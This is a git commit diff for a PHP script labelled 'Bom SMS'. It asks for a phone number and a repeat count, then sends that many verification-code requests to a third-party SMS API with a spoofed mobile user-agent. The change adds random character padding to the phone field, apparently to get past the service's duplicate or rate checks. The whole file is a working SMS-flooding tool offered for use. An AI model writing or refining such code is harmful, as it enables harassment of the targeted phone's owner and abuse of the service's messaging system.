e9c4ed89b574e77b3452023ef559767d9881ff7c
Peking <67999065+peking707@users.noreply.github.com>
2021-02-07 10:46:24 +0000

    Update run.php

--- run.php
+++ run.php
@@ -12,9 +12,27 @@ curl_setopt($ch, CURLOPT_COOKIEFILE, 'cok.txt');
 	$result = curl_exec($ch);
 	return $result;
 }
+function random($length = 5){
+    $characters = '+++++++++++++';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
+function random2($length = 3){
+    $characters = '.+.+..+..++.+..+..++..++..';
+    $charactersLength = strlen($characters);
+    $randomString = '';
+    for ($i = 0; $i < $length; $i++) {
+        $randomString .= $characters[rand(0, $charactersLength - 1)];
+    }
+    return $randomString;
+}
 
 $ua = array(
-"user-agent: Mozilla/5.0 (Linux; Android 6.0.1; SM-J500G Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36",
+"user-agent: Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36",
 "content-type: application/x-www-form-urlencoded",
 "referer: https://www.shendas.com/id/",
     );
@@ -29,15 +47,17 @@ echo "
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
 ╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯Bom SMS";
 
-echo "\n\n[+]Nomor?  ";
+echo "\n\n[+]Nomor?  [Jangan 62/08]";
 $nmr = trim(fgets(STDIN));
 echo "[+]Brapa?  ";
 $brp = trim(fgets(STDIN));
 echo "\n";
 for ($i = 0; $i < $brp; $i++){
-$data = "phone=$nmr&dest=62&code=8748&recommend=6033306&code_rand=1612725492763&lang=id";
-
+$ran = random();
+$ran2 = random2();
+$data = "phone=8$ran^$ran2>$ran2/$nmr&dest=62&code=8748&recommend=6033306&code_rand=1612725492763&lang=id";
 $send = curl("https://www.shendas.com/api/sms/sendSMSCode", $ua, $data);
 echo "$send\n";
+
 }
 ?>
